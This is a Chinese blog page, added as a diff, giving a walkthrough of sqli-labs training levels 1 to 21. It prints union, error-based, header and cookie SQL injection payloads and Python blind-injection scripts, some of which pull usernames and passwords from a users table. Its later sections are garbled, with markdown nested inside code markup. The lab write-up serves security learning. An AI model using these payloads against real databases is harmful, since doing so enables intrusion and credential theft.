@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="John Doe">
+    
+    
+    
+    
+    
+    
+    <title>sqli_labs | hexo</title>
+    <link href="http://example.com" rel="prefetch" />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="http://example.com">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">hexo</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/categories">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                </li>
+                
+                
+                
+                
+                
+                <li class="">
+                    <a href="/tags">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="http://example.com">hexo</a>
+        >
+        <span>sqli_labs</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2023/12/25/sqli_labs/">sqli_labs</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2023-12-25
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2023/12/25/sqli_labs/">sqli_labs</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2023-12-25
+            </p>
+            <p>
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><ul>
+<li><p>字符型闭合，闭合符为<code>&#39;</code>,可直接使用联合查询。</p>
+</li>
+<li><p><code>http://192.168.2.48/sqli/Less-3/?id=0&#39; union select 1,2,database()-- -</code></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251031444.png" alt="image-20231225103149542"></p>
+</li>
+</ul>
+<h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><ul>
+<li><p>数字型闭合，可直接使用联合查询。</p>
+</li>
+<li><p><code>http://192.168.2.48/sqli/Less-3/?id=0 union select 1,2,database()-- -</code></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251034876.png" alt="image-20231225103412877"></p>
+</li>
+</ul>
+<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><ul>
+<li><p>字符型闭合，闭合符为<code>&#39;)</code>，可直接使用联合查询</p>
+</li>
+<li><p><code>http://192.168.2.48/sqli/Less-3/?id=0&#39;) union select 1,2,database()-- -</code></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251036501.png" alt="image-20231225103640489"></p>
+</li>
+</ul>
+<h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><ul>
+<li><p>字符型闭合，闭合符为<code>&quot;)</code>，可直接使用联合查询</p>
+</li>
+<li><p><code>http://192.168.2.48/sqli/Less-4/?id=0&quot;) union select 1,2,database()-- -</code></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251039241.png" alt="image-20231225103934640"></p>
+</li>
+</ul>
+<h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><ul>
+<li><p>字符型闭合，闭合符为<code>&#39;</code>，使用报错注入</p>
+</li>
+<li><p><code>http://192.168.2.48/sqli/Less-5/?id=1&#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -</code></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251041116.png" alt="image-20231225104155809"></p>
+</li>
+</ul>
+<h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><ul>
+<li>字符型闭合，闭合符为<code>&quot;</code>，使用报错注入</li>
+<li><code>http://192.168.2.48/sqli/Less-6/?id=1&quot; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -</code></li>
+<li><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251048956.png" alt="image-20231225104842104"></li>
+</ul>
+<h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><ul>
+<li><p>字符型闭合，闭合符为<code>&#39;))</code>，布尔盲注，使用python脚本。</p>
+</li>
+<li><pre><code>import requests
+session = requests.session()
+url = &quot;http://192.168.2.48/sqli/Less-7/?id=1&#39;))&quot;
+
+
+
+def db():
+    name = &#39;&#39;
+    for i in range(1,50):
+        begin =32
+        end =128
+        tmp = (begin+end)//2
+        while begin &lt; end :
+            paramsGet = url + &quot;/**/and/**/ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i, tmp)
+            response = session.get(paramsGet)
+            if &#39;You are in.... Use outfile......&#39; in response.text:
+                begin = tmp + 1
+                tmp = (begin+end)//2
+            else:
+                end = tmp
+                tmp = (begin+end)//2
+        if(tmp==32):
+            break
+        name += chr(tmp)
+        print(name)
+db()
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20231225110235188](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251408975.png)</span><br><span class="line"></span><br><span class="line"># Less-8</span><br><span class="line"></span><br><span class="line">- 字符型闭合，闭合符为`&#x27;`，布尔盲注，使用python脚本。</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  import requests</span><br><span class="line">  session = requests.session()</span><br><span class="line">  url = &quot;http://192.168.2.48/sqli/Less-8/?id=1&#x27;&quot;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  def db():</span><br><span class="line">      name = &#x27;&#x27;</span><br><span class="line">      for i in range(1,50):</span><br><span class="line">          begin =32</span><br><span class="line">          end =128</span><br><span class="line">          tmp = (begin+end)//2</span><br><span class="line">          while begin &lt; end :</span><br><span class="line">              paramsGet = url + &quot;/**/and/**/ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;.format(i, tmp)</span><br><span class="line">              response = session.get(paramsGet)</span><br><span class="line">              if &#x27;You are in...........&#x27; in response.text:</span><br><span class="line">                  begin = tmp + 1</span><br><span class="line">                  tmp = (begin+end)//2</span><br><span class="line">              else:</span><br><span class="line">                  end = tmp</span><br><span class="line">                  tmp = (begin+end)//2</span><br><span class="line">          if(tmp==32):</span><br><span class="line">              break</span><br><span class="line">          name += chr(tmp)</span><br><span class="line">          print(name)</span><br><span class="line">  db()</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251105015.png" alt="image-20231225110522187"></p>
+</li>
+</ul>
+<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><ul>
+<li><p>字符型闭合，闭合符为<code>&#39;</code>，时间盲注，使用python脚本。</p>
+</li>
+<li><pre><code>import requests
+import time
+session = requests.session()
+url = &quot;http://192.168.2.48/sqli/Less-9/?id=1&#39;&quot;
+
+def db():
+    name = &quot;&quot;
+    for i in range(1, 100):
+        begin = 32
+        end = 128
+        tmp = (begin + end) // 2
+        threshold = 0.05
+        while begin &lt; end:
+            start_time = time.time()
+            paramsGet = (
+                url
+                 + &quot;/**/and/**/If(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(0.1),1)--+&quot;.format(
+                # + &quot;/**/and/**/If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(0.1),1)--+&quot;.format(
+                # + &quot;/**/and/**/If(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(1),1)--+&quot;.format(
+                # + &quot;/**/and/**/If(ascii(substr((select group_concat(username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(1),1)--+&quot;.format(
+                    i, tmp
+                )
+            )
+            session.get(paramsGet)
+            end_time = time.time()
+            elapsed_time = end_time - start_time
+            if elapsed_time &gt;= threshold:
+                begin = tmp + 1
+                tmp = (begin + end) // 2
+            else:
+                end = tmp
+                tmp = (begin + end) // 2
+        if tmp == 32:
+            break
+        name += chr(tmp)
+        print(name)
+db()
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20231225110723912](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251409012.png)</span><br><span class="line"></span><br><span class="line"># Less-10</span><br><span class="line"></span><br><span class="line">- 字符型闭合，闭合符为`&quot;`，时间盲注，使用python脚本。</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  import requests</span><br><span class="line">  import time</span><br><span class="line">  session = requests.session()</span><br><span class="line">  url = &#x27;http://192.168.2.48/sqli/Less-10/?id=1&quot;&#x27;</span><br><span class="line">  </span><br><span class="line">  def db():</span><br><span class="line">      name = &quot;&quot;</span><br><span class="line">      for i in range(1, 100):</span><br><span class="line">          begin = 32</span><br><span class="line">          end = 128</span><br><span class="line">          tmp = (begin + end) // 2</span><br><span class="line">          threshold = 0.05</span><br><span class="line">          while begin &lt; end:</span><br><span class="line">              start_time = time.time()</span><br><span class="line">              paramsGet = (</span><br><span class="line">                  url</span><br><span class="line">                   + &quot;/**/and/**/If(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(0.1),1)--+&quot;.format(</span><br><span class="line">                  # + &quot;/**/and/**/If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(0.1),1)--+&quot;.format(</span><br><span class="line">                  # + &quot;/**/and/**/If(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(1),1)--+&quot;.format(</span><br><span class="line">                  # + &quot;/**/and/**/If(ascii(substr((select group_concat(username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(1),1)--+&quot;.format(</span><br><span class="line">                      i, tmp</span><br><span class="line">                  )</span><br><span class="line">              )</span><br><span class="line">              session.get(paramsGet)</span><br><span class="line">              end_time = time.time()</span><br><span class="line">              elapsed_time = end_time - start_time</span><br><span class="line">              if elapsed_time &gt;= threshold:</span><br><span class="line">                  begin = tmp + 1</span><br><span class="line">                  tmp = (begin + end) // 2</span><br><span class="line">              else:</span><br><span class="line">                  end = tmp</span><br><span class="line">                  tmp = (begin + end) // 2</span><br><span class="line">          if tmp == 32:</span><br><span class="line">              break</span><br><span class="line">          name += chr(tmp)</span><br><span class="line">          print(name)</span><br><span class="line">  db()</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251108475.png" alt="image-20231225110842730"></p>
+</li>
+</ul>
+<h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><ul>
+<li>在登录名后面可直接插入<strong>联合查询</strong>，字符型闭合，闭合符为<code>&#39;</code></li>
+<li><code>0&#39; union select 1,database()-- -</code></li>
+<li><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251111427.png" alt="image-20231225111136236"></li>
+</ul>
+<h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><ul>
+<li>在登录名后面可直接插入<strong>联合查询</strong>，字符型闭合，闭合符为<code>&quot;)</code></li>
+<li><code>0&quot;) union select 1,database()-- -</code></li>
+<li><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251112723.png" alt="image-20231225111250003"></li>
+</ul>
+<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><ul>
+<li>在登录名后面可直接插入<strong>报错注入</strong>，字符型闭合，闭合符为<code>&#39;)</code></li>
+<li><code>admin&#39;) and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -</code></li>
+<li><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251116377.png" alt="image-20231225111618560"></li>
+</ul>
+<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><ul>
+<li>在登录名后面可直接插入<strong>报错注入</strong>，字符型闭合，闭合符为<code>&quot;</code></li>
+<li><code>admin&quot; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -</code></li>
+<li><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251117300.png" alt="image-20231225111731123"></li>
+</ul>
+<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><ul>
+<li><p>在登录名后面可进行<strong>布尔盲注</strong>，字符型闭合，闭合符为<code>&#39;</code>，使用python脚本</p>
+</li>
+<li><pre><code>import requests
+
+session = requests.Session()
+url = &quot;http://192.168.2.48/sqli/Less-15/&quot;
+
+
+def db_2():
+    name = &#39;&#39;
+    for i in range(1, 80):
+        start = 32
+        end = 128  # 使用可打印的ASCII范围32到127
+        while start &lt; end:
+            mid = (start + end) // 2
+
+            data = &#123;
+                &quot;uname&quot;: f&quot;admin&#39; and if(ascii(substr((select database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;,
+                &quot;passwd&quot;: &quot;admin&quot;,
+                &quot;submit&quot;: &quot;Submit&quot;
+            &#125;
+            response = session.post(url, data=data)
+            # print(response.text)
+            # print(len(response.text))
+            if &#39;flag&#39; in response.text:
+                # 如果内容大于某个长度，假设SQL条件为真
+                start = mid+1
+            else:
+                end = mid
+            # 调试输出来理解过程
+            print(f&quot;测试位置 &#123;i&#125;, 字符ASCII: &#123;mid&#125;, start = &#123;start&#125;, end = &#123;end&#125;&quot;)
+
+        # 循环结束后需要重新设置mid点
+        mid = (start + end) // 2
+        found_char = chr(mid)
+        if mid == 32:  # 如果ASCII是32（空格），可能表示结束
+            break
+
+        name += found_char
+        print(f&quot;找到的字符: &#123;found_char&#125;, 目前的数据库名称: &#123;name&#125;&quot;)
+
+    print(f&quot;最终数据库名称: &#123;name&#125;&quot;)
+
+db_2()
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20231225113012756](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251130768.png)</span><br><span class="line"></span><br><span class="line"># Less-16</span><br><span class="line"></span><br><span class="line">- 在登录名后面可进行**布尔盲注**，字符型闭合，闭合符为`&quot;)`，使用python脚本</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  import requests</span><br><span class="line">  </span><br><span class="line">  session = requests.Session()</span><br><span class="line">  url = &quot;http://192.168.2.78/sqli/Less-16/&quot;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  def db_2():</span><br><span class="line">      name = &#x27;&#x27;</span><br><span class="line">      for i in range(1, 80):</span><br><span class="line">          start = 32</span><br><span class="line">          end = 128  # 使用可打印的ASCII范围32到127</span><br><span class="line">          while start &lt; end:</span><br><span class="line">              mid = (start + end) // 2</span><br><span class="line">  </span><br><span class="line">              data = &#123;</span><br><span class="line">                  &quot;uname&quot;: f&#x27;admin&quot;) and if(ascii(substr((select group_concat(id,username,password) from users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&#x27;,</span><br><span class="line">                  &quot;passwd&quot;: &quot;admin&quot;,</span><br><span class="line">                  &quot;submit&quot;: &quot;Submit&quot;</span><br><span class="line">              &#125;</span><br><span class="line">              response = session.post(url, data=data)</span><br><span class="line">              # print(response.text)</span><br><span class="line">              # print(len(response.text))</span><br><span class="line">              if &#x27;flag&#x27; in response.text:</span><br><span class="line">                  # 如果内容大于某个长度，假设SQL条件为真</span><br><span class="line">                  start = mid+1</span><br><span class="line">              else:</span><br><span class="line">                  end = mid</span><br><span class="line">              # 调试输出来理解过程</span><br><span class="line">              print(f&quot;测试位置 &#123;i&#125;, 字符ASCII: &#123;mid&#125;, start = &#123;start&#125;, end = &#123;end&#125;&quot;)</span><br><span class="line">  </span><br><span class="line">          # 循环结束后需要重新设置mid点</span><br><span class="line">          mid = (start + end) // 2</span><br><span class="line">          found_char = chr(mid)</span><br><span class="line">          if mid == 32:  # 如果ASCII是32（空格），可能表示结束</span><br><span class="line">              break</span><br><span class="line">  </span><br><span class="line">          name += found_char</span><br><span class="line">          print(f&quot;找到的字符: &#123;found_char&#125;, 目前的数据库名称: &#123;name&#125;&quot;)</span><br><span class="line">  </span><br><span class="line">      print(f&quot;最终数据库名称: &#123;name&#125;&quot;)</span><br><span class="line">  </span><br><span class="line">  db_2()</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251124107.png" alt="image-20231225112423799"></p>
+</li>
+</ul>
+<h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><ul>
+<li>可在修改密码后插入<strong>报错注入</strong>,字符型闭合，闭合符为<code>&#39;</code></li>
+<li><code>0&#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -</code></li>
+<li><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251120490.png" alt="image-20231225112054749"></li>
+</ul>
+<h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><ul>
+<li><p>header注入,用yakit抓包，在User Agent部分插入<strong>报错注入</strong></p>
+</li>
+<li><p><code>SELECT users.username, users.password FROM users WHERE users.username=&#39;admin&#39; and users.password=&#39;admin&#39; ORDER BY users.id DESC LIMIT 0,1</code>是指倒序查找用户名密码，所以输入0，在后面插入报错注入，字符型闭合，闭合符为<code>&#39;</code></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251421270.png" alt="image-20231225142128169"></p>
+</li>
+<li><pre><code>POST /sqli/Less-18/ HTTP/1.1
+Host: 192.168.2.48
+Accept-Encoding: gzip, deflate
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.2.48
+Content-Type: application/x-www-form-urlencoded
+User-Agent:0&#39; and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) or &#39;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Cache-Control: max-age=0
+Accept-Language: zh-CN,zh;q=0.9
+Referer: http://192.168.2.48/sqli/Less-18/
+Content-Length: 30
+
+uname=0&amp;passwd=0&amp;submit=Submit
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20231225153740932](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251537761.png)</span><br><span class="line"></span><br><span class="line"># Less-19</span><br><span class="line"></span><br><span class="line">- 用yakit抓包，根据页面显示，在referer后面可进行**报错注入**</span><br><span class="line">- ![image-20231225153902186](sqli_labs.assets/image-20231225153902186.png)</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  POST /sqli/Less-19/ HTTP/1.1</span><br><span class="line">  Host: 192.168.2.48</span><br><span class="line">  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">  Accept-Encoding: gzip, deflate</span><br><span class="line">  Cache-Control: max-age=0</span><br><span class="line">  Referer: 0&#x27; and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) or &#x27;</span><br><span class="line">  Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">  Origin: http://192.168.2.48</span><br><span class="line">  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">  Upgrade-Insecure-Requests: 1</span><br><span class="line">  Content-Type: application/x-www-form-urlencoded</span><br><span class="line">  Content-Length: 30</span><br><span class="line">  </span><br><span class="line">  uname=0&amp;passwd=0&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312251540921.png" alt="image-20231225154052448"></p>
+</li>
+</ul>
+<h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><ul>
+<li><p>用yakit抓包，根据页面显示，在cookie后面可进行<strong>报错注入</strong>,cookie是在get方式。字符型闭合，闭合符为<code>&#39;</code></p>
+</li>
+<li><p><img src="/sqli_labs.assets/image-20231225162927701.png" alt="image-20231225162927701"></p>
+</li>
+<li><pre><code>GET /sqli/Less-20/index.php HTTP/1.1
+Host: 192.168.2.48
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Cookie: uname=adm&#39; and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) or &#39;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.2.48/sqli/Less-20/
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-20231225163020198](https://raw.githubusercontent.com/guangfa29/123/main/img/202312251630973.png)</span><br><span class="line"></span><br><span class="line"># Less-21</span><br><span class="line"></span><br><span class="line">- 用yakit抓包，根据页面显示，在cookie后面可进行**报错注入**,并且代码被进行了编码，所以需要将注入的代码进行编码后注入。字符型闭合，闭合符为`&#x27;`</span><br><span class="line">- ![image-20231225163212438](sqli_labs.assets/image-20231225163212438.png)</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  GET /sqli/Less-21/index.php HTTP/1.1</span><br><span class="line">  Host: 192.168.2.48</span><br><span class="line">  Upgrade-Insecure-Requests: 1</span><br><span class="line">  Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">  Cache-Control: max-age=0</span><br><span class="line">  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">  Accept-Encoding: gzip, deflate</span><br><span class="line">  Cookie: uname=MCcgYW5kIChleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSkgb3IgJw==</span><br><span class="line">  Referer: http://192.168.2.48/sqli/Less-21/</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
